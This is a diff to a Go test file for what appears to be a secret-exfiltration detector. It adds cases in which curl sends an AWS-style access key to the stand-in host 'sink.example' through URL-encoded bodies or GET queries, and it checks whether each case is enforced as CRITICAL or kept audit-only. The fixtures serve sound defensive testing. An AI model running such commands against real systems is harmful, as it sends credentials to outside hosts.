@@ -1649,12 +1649,13 @@ func TestTrustedActionStaticUploadMatchesEffectivePayloadOnly(t *testing.T) {
 	}
 }
 
-func TestTrustedActionTransformedCurlOperandsRemainAuditOnly(t *testing.T) {
+func TestTrustedActionTransformedCurlOperandProjection(t *testing.T) {
 	generation := mustCompileRulePackGeneration(defaultRuleCategories)
 	for _, test := range []struct {
-		name   string
-		ruleID string
-		argv   []string
+		name        string
+		ruleID      string
+		argv        []string
+		wantEnforce bool
 	}{
 		{
 			name:   "digit-leading dashless range is normalized",
@@ -1662,6 +1663,50 @@ func TestTrustedActionTransformedCurlOperandsRemainAuditOnly(t *testing.T) {
 			argv: []string{
 				"curl", "--range", "1AKIA7G4N2K9Q6M8R3T5V",
 				"https://sink.example/safe",
+			},
+		},
+		{
+			name:   "URL encoded body preserves stable AWS key bytes",
+			ruleID: "SEC-AWS-KEY",
+			argv: []string{
+				"curl", "--data-urlencode", "key=AKIA7G4N2K9Q6M8R3T5V value",
+				"https://sink.example/upload",
+			},
+			wantEnforce: true,
+		},
+		{
+			name:   "URL encoded GET query preserves stable AWS key bytes",
+			ruleID: "SEC-AWS-KEY",
+			argv: []string{
+				"curl", "--get", "--data-urlencode",
+				"key=AKIA7G4N2K9Q6M8R3T5V value",
+				"https://sink.example/upload",
+			},
+			wantEnforce: true,
+		},
+		{
+			name:   "request target suppresses URL encoded GET query",
+			ruleID: "SEC-AWS-KEY",
+			argv: []string{
+				"curl", "--get", "--data-urlencode",
+				"key=AKIA7G4N2K9Q6M8R3T5V value",
+				"--request-target", "/safe", "https://sink.example/upload",
+			},
+		},
+		{
+			name:   "sibling URL encoded file closes literal proof",
+			ruleID: "SEC-AWS-KEY",
+			argv: []string{
+				"curl", "--data-urlencode", "key=AKIA7G4N2K9Q6M8R3T5V value",
+				"--data-urlencode", "@payload.txt", "https://sink.example/upload",
+			},
+		},
+		{
+			name:   "invalid sibling data file closes literal proof",
+			ruleID: "SEC-AWS-KEY",
+			argv: []string{
+				"curl", "--data-urlencode", "key=AKIA7G4N2K9Q6M8R3T5V value",
+				"--data", "@", "https://sink.example/upload",
 			},
 		},
 		{
@@ -1688,9 +1733,16 @@ func TestTrustedActionTransformedCurlOperandsRemainAuditOnly(t *testing.T) {
 				[]RuleFinding{finding},
 			)
 			got = applyTrustedActionProofBoundary(got, true)
-			if len(got) != 1 || got[0].contributesToEnforcement() ||
-				got[0].Severity != "LOW" {
+			if len(got) != 1 ||
+				got[0].contributesToEnforcement() != test.wantEnforce {
 				t.Fatalf("transformed operand disposition = %#v", got)
+			}
+			wantSeverity := "LOW"
+			if test.wantEnforce {
+				wantSeverity = "CRITICAL"
+			}
+			if got[0].Severity != wantSeverity {
+				t.Fatalf("severity = %q, want %q: %#v", got[0].Severity, wantSeverity, got)
 			}
 		})
 	}
